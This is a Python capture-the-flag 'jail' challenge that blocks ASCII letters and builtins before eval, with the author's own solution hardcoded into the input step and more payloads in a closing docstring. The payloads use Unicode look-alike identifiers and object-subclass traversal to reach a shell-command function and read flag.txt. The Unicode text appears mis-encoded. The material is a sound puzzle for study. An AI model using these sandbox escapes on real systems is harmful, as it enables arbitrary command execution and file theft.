#!/usr/local/bin/python3


# the flag is located at './flag.txt'
banner = """
  ================================================================  
  ================================================================  
  ================================================================  
  ================================================================  
     ---          --             --             --          ---     
     ---          --             --             --          ---     
     ---          --        +====--====+        --          ---     
     ---          --      +======--=======      --          ---     
     ---          --    +========--========+    --          ---     
     ---          --   %#########--#########%   --          ---     
     ---          --  %%%%%%%%%%%--%%%%%%%%%%%  --          ---     
     ---          --  %%%%%%%%%%%--%%%%%%%%%%%  --          ---     
     ---          -- ============--============ --          ---     
     ---          -- ============--============ --          ---     
     ---          -- ============--============ --          ---     
     ---          -- %%%%%%%%%%%%--%%%%%%%%%%%% --          ---     
     ---          --%%%%%%%%%%%%%--%%%%%%%%%%%%%--          ---     
     ---          --%%%%%%%%%%%%%--%%%%%%%%%%%%%--          ---     
     ---          -- %%%%%%%%%%%%--%%%%%%%%%%%% --          ---     
     ---          --  %%%%%%%%%%%--%%%%%%%%%%%  --          ---     
     ---          --     %%%%%%%%--%%%%%%%%     --          ---     
     ---          --      %%%%%%%--%%%%%%%      --          ---     
     ---          --       %%%%%%--%%%%%%       --          ---     
     ---          --       %%%%%%--%%%%%%       --          ---     
     ---          -- +=====+%%%%%--%%%%%*=====+ --          ---     
     ---         +--========#%%%%--%%%%#+=======--+         ---     
     ---      +===--=========+#%%--%%%+=========--===+      ---     
     ---     =====--===========+%--%+===========--=====     ---     
     ---    #*****--*************--*************--******    ---     
     ---   %%%%%%%--%%%%%%%%%%%%%--%%%%%%%%%%%%%--%%%%%%%   ---     
     ---  %%%%%%%%--%%%%%%%%%%%%%--%%%%%%%%%%%%%--%%%%%%%%  ---     
  =========+++++++==+++++++++++++==+++++++++++++==+++++++=========  
  ================================================================  
  ================================================================  
  ================================================================  

  Given a limited character set and limited execution, try to read "flag.txt" from the system!
"""

# No opening files for you!
open = None

# and no letters for you!!!
def is_allowed(your_code):
  blacklist = set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ") 
  for c in your_code:
     if c in blacklist: 
        print("C failed", c)
        return False
  return True

MAX_CODE_SIZE = 300
def jail3():
    print("You made it here? Fine, I guess i'll just remove the entire alphabet from you...")
    print("You get 15 characters only this time")
    your_code = input("> ")


    your_code = """[*[*().__ğ˜¤ğ˜­ğ˜¢ğ˜´ğ˜´__.__ğ˜£ğ˜¢ğ˜´ğ˜¦__.__ğ˜´ğ˜¶ğ˜£ğ˜¤ğ˜­ğ˜¢ğ˜´ğ˜´ğ˜¦ğ˜´__()[140].__ğ˜ªğ˜¯ğ˜ªğ˜µ__.__ğ˜¨ğ˜­ğ˜°ğ˜£ğ˜¢ğ˜­ğ˜´__.ğ˜·ğ˜¢ğ˜­ğ˜¶ğ˜¦ğ˜´()][6].ğ˜·ğ˜¢ğ˜­ğ˜¶ğ˜¦ğ˜´()][42]([*().__ğ˜¤ğ˜­ğ˜¢ğ˜´ğ˜´__.__ğ˜£ğ˜¢ğ˜´ğ˜¦__.__ğ˜´ğ˜¶ğ˜£ğ˜¤ğ˜­ğ˜¢ğ˜´ğ˜´ğ˜¦ğ˜´__()[140].__ğ˜ªğ˜¯ğ˜ªğ˜µ__.__ğ˜¨ğ˜­ğ˜°ğ˜£ğ˜¢ğ˜­ğ˜´__.ğ˜·ğ˜¢ğ˜­ğ˜¶ğ˜¦ğ˜´()][-5]("{} ./????.???".ğ˜§ğ˜°ğ˜³ğ˜®ğ˜¢ğ˜µ(().__ğ˜¥ğ˜°ğ˜¤__[-3] + ().__ğ˜¥ğ˜°ğ˜¤__[-11] + ().__ğ˜¥ğ˜°ğ˜¤__[-2])).ğ˜³ğ˜¦ğ˜¢ğ˜¥())"""
    if(len(your_code) > MAX_CODE_SIZE):
        print("nope nope nope nope, too many characters: ", len(your_code))
    elif not is_allowed(your_code):
       print("no alphabet allowed!")
    else:
      print(f"Your code has {len(your_code)} characters, go ahead and run it")

      # Whatever, I'll just delete all the builtins!

      
      eval(your_code, {"__builtins__": {}})

if __name__ == "__main__":
    print(banner)
    jail3()



"""
ğ”ªğ”¶_ğ”¢ğ”³ğ”ğ”©(ğ”¦ğ”«ğ”­ğ”²ğ”±())
ğ”ªğ”¶_ğ”¢ğ”³ğ”ğ”©("1+1")

ï½…ï½–ï½ï½Œ(ï½‰ï½ï½ï½•ï½”())
ï½ï½™_ï½…ï½–ï½ï½Œ("1+1")
ğš™ğš›ğš’ğš—ğš(3)
>>> for x,y in enumerate([*().__class__.__base__.__subclasses__()[140].__init__.__globals__.items()]): print(x,str(y)) 

[*().__ğ˜¤ğ˜­ğ˜¢ğ˜´ğ˜´__.__ğ˜£ğ˜¢ğ˜´ğ˜¦__.__ğ˜´ğ˜¶ğ˜£ğ˜¤ğ˜­ğ˜¢ğ˜´ğ˜´ğ˜¦ğ˜´__()[140].__ğ˜ªğ˜¯ğ˜ªğ˜µ__.__ğ˜¨ğ˜­ğ˜°ğ˜£ğ˜¢ğ˜­ğ˜´__.ğ˜·ğ˜¢ğ˜­ğ˜¶ğ˜¦ğ˜´()][-5]("{} ./????.???".ğ˜§ğ˜°ğ˜³ğ˜®ğ˜¢ğ˜µ(().__ğ˜¥ğ˜°ğ˜¤__[-3] + ().__ğ˜¥ğ˜°ğ˜¤__[-11] + ().__ğ˜¥ğ˜°ğ˜¤__[-2])).ğ˜³ğ˜¦ğ˜¢ğ˜¥()

# to get print
[*[*().__class__.__base__.__subclasses__()[140].__init__.__globals__.values()][6].values()][42]
[*[*().__ğ˜¤ğ˜­ğ˜¢ğ˜´ğ˜´__.__ğ˜£ğ˜¢ğ˜´ğ˜¦__.__ğ˜´ğ˜¶ğ˜£ğ˜¤ğ˜­ğ˜¢ğ˜´ğ˜´ğ˜¦ğ˜´__()[140].__ğ˜ªğ˜¯ğ˜ªğ˜µ__.__ğ˜¨ğ˜­ğ˜°ğ˜£ğ˜¢ğ˜­ğ˜´__.ğ˜·ğ˜¢ğ˜­ğ˜¶ğ˜¦ğ˜´()][6].values()][42]([*().__ğ˜¤ğ˜­ğ˜¢ğ˜´ğ˜´__.__ğ˜£ğ˜¢ğ˜´ğ˜¦__.__ğ˜´ğ˜¶ğ˜£ğ˜¤ğ˜­ğ˜¢ğ˜´ğ˜´ğ˜¦ğ˜´__()[140].__ğ˜ªğ˜¯ğ˜ªğ˜µ__.__ğ˜¨ğ˜­ğ˜°ğ˜£ğ˜¢ğ˜­ğ˜´__.ğ˜·ğ˜¢ğ˜­ğ˜¶ğ˜¦ğ˜´()][-5]("{} ./????.???".ğ˜§ğ˜°ğ˜³ğ˜®ğ˜¢ğ˜µ(().__ğ˜¥ğ˜°ğ˜¤__[-3] + ().__ğ˜¥ğ˜°ğ˜¤__[-11] + ().__ğ˜¥ğ˜°ğ˜¤__[-2])).ğ˜³ğ˜¦ğ˜¢ğ˜¥())

[*().__class__.__base__.__subclasses__()[140].__init__.__globals__.items()][6][1]['print']([*().__ğ˜¤ğ˜­ğ˜¢ğ˜´ğ˜´__.__ğ˜£ğ˜¢ğ˜´ğ˜¦__.__ğ˜´ğ˜¶ğ˜£ğ˜¤ğ˜­ğ˜¢ğ˜´ğ˜´ğ˜¦ğ˜´__()[140].__ğ˜ªğ˜¯ğ˜ªğ˜µ__.__ğ˜¨ğ˜­ğ˜°ğ˜£ğ˜¢ğ˜­ğ˜´__.ğ˜·ğ˜¢ğ˜­ğ˜¶ğ˜¦ğ˜´()][-5]("{} ./????.???".ğ˜§ğ˜°ğ˜³ğ˜®ğ˜¢ğ˜µ(().__ğ˜¥ğ˜°ğ˜¤__[-3] + ().__ğ˜¥ğ˜°ğ˜¤__[-11] + ().__ğ˜¥ğ˜°ğ˜¤__[-2])).ğ˜³ğ˜¦ğ˜¢ğ˜¥())
"""